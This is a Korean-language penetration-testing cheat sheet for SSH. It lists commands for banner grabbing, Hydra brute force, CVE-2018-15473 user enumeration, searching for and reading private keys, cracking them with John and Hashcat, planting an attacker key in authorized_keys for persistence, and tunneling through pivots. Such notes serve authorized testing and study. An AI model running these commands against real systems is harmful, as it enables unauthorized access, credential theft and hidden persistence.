# SSH (22)

Secure Shell. Linux/Unix 시스템 원격 접근의 기본 프로토콜.

---

## 열거

```bash
# 버전 확인 (배너 그래빙)
nmap -sV -p 22 TARGET
nc -nv TARGET 22

# SSH 지원 인증 방법 확인
nmap --script ssh-auth-methods -p 22 TARGET

# SSH 호스트 키
ssh-keyscan TARGET
```

---

## 인증

```bash
# 비밀번호
ssh user@TARGET

# SSH 키
ssh -i id_rsa user@TARGET
chmod 600 id_rsa  # 권한 설정 필수

# 특정 포트
ssh user@TARGET -p 2222

# 오래된 알고리즘 (레거시 시스템)
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa user@TARGET
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa user@TARGET -i id_rsa
```

---

## Brute Force

```bash
# Hydra
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4

# 사용자 열거 (CVE-2018-15473, OpenSSH < 7.7)
python3 ssh_user_enum.py TARGET -w users.txt

# nxc
nxc ssh TARGET -u users.txt -p passwords.txt --no-bruteforce
```

---

## 공격

### SSH 키 탈취

```bash
# 개인키 파일 탐색
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh/
cat /home/user/.ssh/id_rsa

# authorized_keys 확인 (다른 신뢰 관계)
cat /home/*/.ssh/authorized_keys

# known_hosts에서 target 도출
cat /home/*/.ssh/known_hosts
```

### SSH 키 cracking

```bash
# 암호화된 SSH 키에서 hash 추출
ssh2john id_rsa > id_rsa.hash

# John으로 cracking
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat -m 22921 id_rsa.hash wordlist.txt  # RSA/DSA (OpenSSH)
```

### 설정 파일 악용

```bash
# SSH 설정 확인
cat /etc/ssh/sshd_config

# 주요 확인 항목
PermitRootLogin yes          # root 직접 로그인 허용
PasswordAuthentication yes   # 비밀번호 인증 허용
PubkeyAuthentication yes     # 공개키 인증
AuthorizedKeysFile           # authorized_keys 경로
AllowUsers / AllowGroups     # 허용 사용자/그룹
```

### Authorized Keys 추가 (지속성)

```bash
# 공격자 키 생성
ssh-keygen -t ed25519 -f attacker_key -N ''

# target에 공개키 추가
echo "ATTACKER_PUBKEY" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys

# 접속
ssh -i attacker_key user@TARGET
```

---

## SSH tunneling

```bash
# Local Port Forwarding (target 내부 포트를 로컬로)
ssh -L LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT user@TARGET
# 예: target 뒤의 내부 웹서버 접근
ssh -L 8080:10.0.0.5:80 user@TARGET

# Remote Port Forwarding (로컬 포트를 target으로)
ssh -R REMOTE_PORT:LOCAL_TARGET:LOCAL_PORT user@TARGET

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@TARGET
# proxychains 설정: socks5 127.0.0.1 1080

# SSH over SSH (Pivot)
ssh -J user@PIVOT user@INTERNAL_TARGET
```

---

## Nmap NSE

```bash
nmap --script=ssh-brute -p 22 TARGET
nmap --script=ssh2-enum-algos -p 22 TARGET
nmap --script=ssh-hostkey -p 22 TARGET
```
